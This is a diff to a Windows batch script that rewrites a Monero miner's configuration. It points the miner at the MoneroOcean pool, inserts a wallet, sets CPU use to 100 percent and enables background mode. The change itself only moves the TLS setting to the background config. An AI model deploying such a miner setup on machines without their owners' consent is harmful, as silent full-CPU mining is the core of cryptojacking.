@@ -288,10 +288,6 @@ if not [%EMAIL%] == [] (
 
 powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:20128\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
-
-powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"tls\": *\".*\",', '\"tls\": \"true\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
-
-
 powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
@@ -299,6 +295,12 @@ powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replac
 
 copy /Y "%USERPROFILE%\kako\config.json" "%USERPROFILE%\kako\config_background.json" >NUL
 powershell -Command "$out = cat '%USERPROFILE%\kako\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config_background.json'" 
+
+
+
+powershell -Command "$out = cat '%USERPROFILE%\kako\config_background.json' | %%{$_ -replace '\"tls\": *false,', '\"tls\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config_background.json'" 
+
+
 
 rem preparing script
 (
